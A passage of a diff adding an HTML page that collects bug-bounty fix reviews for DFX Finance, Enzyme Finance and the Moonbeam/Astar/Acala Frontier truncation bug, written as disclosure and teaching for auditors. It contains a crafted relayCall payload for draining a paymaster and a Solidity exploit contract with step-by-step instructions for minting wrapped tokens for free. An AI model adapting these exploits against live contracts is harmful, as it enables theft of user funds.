+Typically, tokens have at least six decimals, which limits the potential profit to an amount lower than would be spent on gas for the transaction. However, the EURS token on the Polygon network has only two decimals. By utilizing the EURS token and repeatedly depositing a small amount (around 10,000 times) within a single transaction, an attacker can generate a profit of approximately 172 EURO or 190 USDC per attack by withdrawing the minted curve tokens. At the time of submission, the vulnerable pool had a balance of $237,143 USD, which could have been stolen by an attacker progressively acquiring a larger portion of the pool through successive attacks.</p>
+<h3>PoC</h3>
+<p>The Immunefi team prepared the following <a href="DFXFinance/PoC.sol">PoC</a> to demonstrate the vulnerability.</p>
+<h3>Vulnerability Fix</h3>
+<p>DFX Finance fixed the issue by deploying a new version of the <a href="https://polygonscan.com/address/0xeC1d45DD89f8Efe9dCeDF1141D8ab992fa3Dc9a1#code">AssimilatorV2</a> contract and added a <code>require</code> statement which checks the amount to be transferred from the user is greater than zero. The existing Curve pool was migrated to using the new Assimilator.</p>
+<p>```solidity
+// takes a numeraire amount, calculates the raw amount of eurs, transfers it in and returns the corresponding raw amount
+function intakeNumeraire(int128 <em>amount)
+    external
+    override
+    returns (uint256 amount</em>)
+{
+    uint256 _rate = getRate();</p>
+<pre><code>amount_ = (_amount.mulu(10**tokenDecimals) * 10**oracleDecimals) / _rate;
+
+require(amount_ &gt; 0, "intakeNumeraire/zero-amount!");
+token.safeTransferFrom(msg.sender, address(this), amount_);
+</code></pre>
+<p>}
+```</p>
+<h1>5. Enzyme Finance - Missing Privilege Check</h1>
+<p>Reported by: @rootrescue</p>
+<p>Protocol: Enzyme Finance</p>
+<p>Date: Mar 28, 2023</p>
+<p>Bounty: $400,000</p>
+<h3>TL;DR</h3>
+<p>Enzyme Finance's use of the Gas Station Network had a vulnerability in their <code>preRelayedCall()</code> function due to missing validation of the forwarder address. Attackers could exploit this by using a malicious forwarder to relay transactions and manipulate fees, allowing them to drain funds from the paymaster. The fix added a check to ensure only trusted forwarders are used, preventing unauthorized fee manipulation and protecting the system from exploitation.</p>
+<h3>Vulnerability Analysis</h3>
+<p>Enzyme Finance is a decentralized asset management platform built on Ethereum. It enables anyone to create, manage, and invest in custom investment strategies using a variety of different assets, including cryptocurrencies and other digital assets.</p>
+<p>Enzyme makes use of the Gas Station Network (GSN) to allow gasless clients to interact with Ethereum smart contracts without users needing ETH for transaction fees.</p>
+<h3>GSN</h3>
+<p>The GSN is a decentralized network of relayers that allows dApps to pay the costs of transactions instead of individual users. This can lower the barrier of entry for users and increase user experience by allowing users to make gasless transactions. </p>
+<p>The GSN makes use of <code>meta-transactions</code>. <code>Meta-transactions</code> are a design pattern in which users sign messages containing information about a transaction they would like to execute, but relayers are responsible for signing the Ethereum transaction, sending it to the network, and paying the gas cost.</p>
+<p>The flow of meta-transactions is as follows:</p>
+<ol>
+<li>The user sends a signed message to the relay server containing transaction details.</li>
+<li>The relay server verifies the transaction and ensures that there are sufficient fees to cover the costs.</li>
+<li>The relay server generates a new transaction that uses the user’s signed message, trusted forwarder’s address, and paymaster’s address to call the relay hub.</li>
+<li>The relay server signs the new transaction and sends it to the Ethereum network, paying the necessary gas fees in advance.</li>
+<li>After receiving the transaction, the relay hub calls the trusted forwarder contract with the user’s signed message and then calls the recipient contract.</li>
+<li>The trusted forwarder validates the user’s signature, recovers the user’s address, and transmits the transaction to the recipient contract.</li>
+<li>The transaction is executed and the blockchain state is updated by the recipient contract.</li>
+<li>Following the completion of the transaction, the relay hub requests reimbursement from the paymaster contract for the relay server’s gas fees.</li>
+<li>The paymaster contract validates the transaction and sends funds (in tokens or ETH) to the relay server to cover the gas fees and any additional service fees.</li>
+</ol>
+<p>Enzyme has a set of contracts that support the use of the GSN. This consists of <code>GasRelayPaymasterLib</code>, <code>GasRelayPaymasterFactory</code>, and <code>GasRelayRecipientMixin</code>. The <code>GasRelayPaymasterFactory</code> helps create instances of paymasters, and the <code>GasRelayRecipientMixin</code> has shared logic that is inherited for <code>relayable</code> transactions. The <code>GasRelayPaymasterLib</code> is responsible for providing the logic for paymasters, and importantly, the rules for calls that can be relayed. The paymaster is intended to validate that the forwarder is approved by the paymaster as well as by the recipient contract in <code>preRelayedCall()</code> function:</p>
+<p><code>solidity
+    function preRelayedCall(
+        GsnTypes.RelayRequest calldata relayRequest,
+        bytes calldata signature,
+        bytes calldata approvalData,
+        uint256 maxPossibleGas
+    )
+    external
+    override
+    returns (bytes memory, bool) {
+        _verifyRelayHubOnly();
+        _verifyForwarder(relayRequest);
+        _verifyValue(relayRequest);
+        _verifyPaymasterData(relayRequest);
+        _verifyApprovalData(approvalData);
+        return _preRelayedCall(relayRequest, signature, approvalData, maxPossibleGas);
+    }
+</code></p>
+<p>However, within Enzyme’s <code>GasRelayPaymasterLib</code> contract, the external function which contained the check for a valid forwarder was overridden:</p>
+<p>``<code>solidity
+    /// @notice Checks whether the paymaster will pay for a given relayed tx
+    /// @param _relayRequest The full relay request structure
+    /// @return context_ The tx signer and the fn sig, encoded so that it can be passed to</code>postRelayCall`
+    /// @return rejectOnRecipientRevert_ Always false
+    function preRelayedCall(
+        IGsnTypes.RelayRequest calldata <em>relayRequest,
+        bytes calldata,
+        bytes calldata,
+        uint256
+    )
+        external
+        override
+        relayHubOnly
+        returns (bytes memory context</em>, bool rejectOnRecipientRevert<em>)
+    {
+        address vaultProxy = getParentVault();
+        require(
+            IVault(vaultProxy).canRelayCalls(</em>relayRequest.request.from),
+            "preRelayedCall: Unauthorized caller"
+        );</p>
+<pre><code>    bytes4 selector = __parseTxDataFunctionSelector(_relayRequest.request.data);
+    require(
+        __isAllowedCall(
+            vaultProxy,
+            _relayRequest.request.to,
+            selector,
+            _relayRequest.request.data
+        ),
+        "preRelayedCall: Function call not permitted"
+    );
+
+    return (abi.encode(_relayRequest.request.from, selector), false);
+}
+</code></pre>
+<p>```</p>
+<p>When a relayed transaction is sent via GSN in a typical flow, the trusted forwarder is being relied on to perform an important security check, verifying the user’s signature when a transaction is relayed. Since a malicious trusted forwarder can be provided due to missing verification of the provided forwarder’s address in the paymaster, the signature verification can be bypassed, and a relay call can be crafted in such a way that the paymaster returns much more fees than expected since the <code>from</code> address is believed to be the address which matches the signature provided. An attacker would craft the following parameters of <code>relayCall</code> to exploit the missing validation after deploying a malicious forwarder:</p>
+<p>```js
+const relayRequest = {
+      from: VaultOwnerAddr, // Address to emulate (signature not verified)
+      to: ComptrollerProxyAddr, // Bypass checks in preRelayedCall()
+      value: 0,
+      gas: ...,
+      nonce: ...,
+      data: '0x39bf70d1', // 0x39bf70d1 == callOnExtension()
+      validUntil: ...,
+};</p>
+<p>const relayData = {
+      gasPrice: ...,
+      pctRelayFee: 1000, // 1000% fee to be returned to relay worker
+      baseRelayFee: 0, // Base fee can be used to manipulate returned funds
+      relayWorker: RelayWorkerAddr, // Attacker relay worker
+      paymaster: PaymasterAddr, // Enzyme controlled paymaster
+      forwarder: ExploitForwarder.address, // Attacker malicious forwarder
+      paymasterData: true, // top up the paymaster if not enough funds
+      clientId: ...,
+};</p>
+<p>let tx = await RelayHub.connect(impersonatedSigner)
+      .relayCall(defaultMaxAcceptance,
+            {
+                   request: relayRequest,
+                   relayData: relayData
+            },
+            requestSignature,
+            approvalData,
+            externalGasLimit,
+      );
+```</p>
+<p>The most relevant changes to the relay data are the <code>forwarder</code>, which is set to the malicious forwarder deployed by the attacker, and the <code>pctRelayFee</code> and <code>baseRelayFee</code> which can be used to manipulate the amount of funds returned to the relayWorker by the paymaster.</p>
+<h3>Vulnerability Fix</h3>
+<p>To address this issue, Enzyme introduced the following <a href="https://github.com/enzymefinance/protocol/commit/e813a20f36565feffb0f07993a730505c7949830">commit</a> to add the required check within the GasRelayPaymasterLib, which verifies if the passed address is a trusted forwarder and reverts otherwise.</p>
+<p>```diff
+    function preRelayedCall(
+        IGsnTypes.RelayRequest calldata <em>relayRequest,
+        bytes calldata,
+        bytes calldata,
+        uint256
+    )
+        external
+        override
+        relayHubOnly
+        returns (bytes memory context</em>, bool rejectOnRecipientRevert<em>)
+    {
++       require(
++           _relayRequest.relayData.forwarder == TRUSTED</em>FORWARDER,
++           "preRelayedCall: Unauthorized forwarder"
++       );</p>
+<pre><code>    address vaultProxy = getParentVault();
+    require(
+        IVault(vaultProxy).canRelayCalls(_relayRequest.request.from),
+        "preRelayedCall: Unauthorized caller"
+    );
+
+    bytes4 selector = __parseTxDataFunctionSelector(_relayRequest.request.data);
+    require(
+        __isAllowedCall(
+            vaultProxy,
+            _relayRequest.request.to,
+            selector,
+            _relayRequest.request.data
+        ),
+        "preRelayedCall: Function call not permitted"
+    );
+
+    return (abi.encode(_relayRequest.request.from, selector), false);
+}
+</code></pre>
+<p>```</p>
+<h1>6. Moonbeam, Astar, And Acala - Library Truncation</h1>
+<p>Reported by: @pwning.eth</p>
+<p>Protocol: Moonbeam, Astar Network, and Acala</p>
+<p>Date: June 27th, 2023</p>
+<p>Bounty: $1,000,000</p>
+<h3>TL;DR</h3>
+<p>In the Frontier pallet for Substrate, there's a vulnerability due to the truncation of <code>msg.value</code> from 256 bits to 128 bits in the <code>transfer</code> function. This causes smart contracts to mistakenly accept large values as valid when they are actually truncated to zero. An attacker can exploit this by creating and withdrawing from wrapper tokens as if they had deposited a large amount of value, leading to the potential draining of all wrapped tokens on the network. This can also affect DEXes by allowing attackers to drain tokens from them as well.</p>
+<h3>Vulnerability Analysis</h3>
+<p>The bug, which was found within Frontier — the Substrate pallet that provides core Ethereum compatibility features within the Polkadot ecosystem–impacted Moonbeam, Astar Network, and Acala.</p>
+<p>On Moonbeam, we have native tokens like <code>MOVR</code> and <code>GLMR</code> and their wrapped counterparts, like <code>WMOVR</code> and <code>WGLRM</code>. Likewise, on Astar, there is <code>Astar</code> and <code>Wrapped Astar</code>.</p>
+<p>The central issue was with how Frontier handled low-level EVM events:</p>
+<p>```rust
+    fn transfer(&amp;mut self, transfer: Transfer) -&gt; Result&lt;(), ExitError&gt; {
+        let source = T::AddressMapping::into<em>account</em>id(transfer.source);
+        let target = T::AddressMapping::into<em>account</em>id(transfer.target);</p>
+<pre><code>    T::Currency::transfer(
+        &amp;source,
+        &amp;target,
+</code></pre>
+<p>@&gt;          transfer.value.low<em>u128().unique</em>saturated<em>into(),
+            ExistenceRequirement::AllowDeath,
+        )
+        .map</em>err(|_| ExitError::OutOfFund)
+    }
+```</p>
+<p>In the above code snippet, we notice in <code>transfer</code> that the <code>msg.value</code> is reduced (or truncated) from 256 bits to 128 bits. This seemingly innocuous oversight might result in a serious discrepancy between the runtime and the EVM environment.</p>
+<p>What is truncation? In simplest terms, truncation means to cut off a portion of the number. If we do decimal truncation of 9.8, we would cut off 0.8 and we would be left with 9. In bit truncation, we truncate the higher bits of a number. For example, truncating a 32 bit number to 16 bits would result in higher-end bits being cut off and only the lower 16 bits staying.</p>
+<p>65539 (32 bit) to 16 bit would result in the number 3. Why?</p>
+<p>65539 is 10000000000000011 in binary. As it only takes 17 bits to hold that number, we only leave with the lower 16 bits (counting from right), and we are left with 0000000000000011, which is 3.</p>
+<p>What does this all mean in the context of the bug? Smart contracts believe that the huge 256 bit <code>msg.value</code> is valid, although the actual transfer never happens, as the truncated value will be zero, even though we passed in <code>msg.value</code> <code>2¹²⁸</code>.</p>
+<p>In reality, we won’t be transferring any native tokens, due to this error. However, smart contracts that accept <code>msg.value</code> as though it were in 256 bit format (wrapper contracts, for example), will think we transferred <code>2¹²⁸</code>!</p>
+<p>With this trick, we could create as many wrapper tokens as we wanted to and later withdraw everything from wrapper contracts. This would drain every wrapped token on the network.</p>
+<p>But that’s not all. With DEXes accepting native transfer of tokens to swap to any other token, we could also drain all DEXes on such a network.</p>
+<p>To illustrate the above, here is a sample contract to exploit the bug:</p>
+<p>```solidity
+// SPDX-License-Identifier: GPL-3.0</p>
+<p>pragma solidity &gt;=0.8.0;</p>
+<p>interface IWETH {
+    function deposit() external payable;
+    function withdraw(uint wad) external;
+}</p>
+<p>contract Exploit {
+    IWMOVR private wmovr;</p>
+<pre><code>constructor(address _wmovr) {
+    wmovr = IWMOVR(_wmovr);
+}
+
+function depositWMOVR() payable external {
+    uint256 val = msg.value + (1 &lt;&lt; 128);
+    wmovr.deposit{value: val}();
+}
+
+function withdrawMOVR(uint256 amount) external {
+    wmovr.withdraw(amount);
+}
+
+function balance() public view returns (uint256) {
+    return address(this).balance;
+}
+
+fallback() external payable {}
+</code></pre>
+<p>}
+```</p>
+<p>A step-by-step guide for understanding how the exploit works practically:</p>
+<ol>
+<li>Deploy the above exploit contract onto the Moonbeam network with the address of the Wrapped MOVR contract.</li>
+<li>Call <code>depositWMOVR()</code> function with <code>msg.value=0</code>. The <code>val</code> will be evaluated into <code>2¹²⁸ + 0</code>. This will mean that during the deposit into <code>WMOVR</code>, we won’t be transferring any <code>MOVR</code> as it will be truncated to <code>0</code>.</li>
+<li>Call <code>withdrawMOVR()</code>. The <code>WMOVR</code> contract will think we deposited <code>2¹²⁸</code> in the previous step thus allowing us to get <code>2¹²⁸</code> <code>MOVR</code> by only paying for the transaction fees!</li>
+<li>Profit.</li>
+</ol>
+<h3>Vulnerability Fix</h3>
+<p>Moonbeam released a new Runtime 1606 which addressed the issue by removing the truncation. More information about the fix can be found <a href="https://moonbeam.network/news/moonbeam-team-releases-urgent-security-patch-for-integer-truncation-bug">here</a> in their security announcement.</p>
+<p>As Moonbeam is also one of the maintainers of the library, they released a <a href="https://github.com/moonbeam-foundation/frontier/compare/652abf16...ca027df5">bug fix</a>.</p>
+<h2>References</h2>
+<p>[1]. https://medium.com/immunefi/raydium-tick-manipulation-bugfix-review-c6aae4527ed6</p>
+<p>[2]. https://medium.com/immunefi/yield-protocol-logic-error-bugfix-review-7b86741e6f50</p>
+<p>[3]. https://medium.com/immunefi/silo-finance-logic-error-bugfix-review-35de29bd934a</p>
+<p>[4]. https://medium.com/immunefi/dfx-finance-rounding-error-bugfix-review-17ba5ffb4114</p>
+<p>[5]. https://medium.com/immunefi/enzyme-finance-missing-privilege-check-bugfix-review-ddb5e87b8058</p>
+<p>[6]. https://medium.com/immunefi/moonbeam-astar-and-acala-library-truncation-bugfix-review-1m-payout-41a862877a5b</p>
+<h2>Contact</h2>
+<p>For questions or suggestions, please contact <a href="https://x.com/tpiliposian">me</a>.</p>
+<p>Tigran Piliposyan</p>
+</body></html>
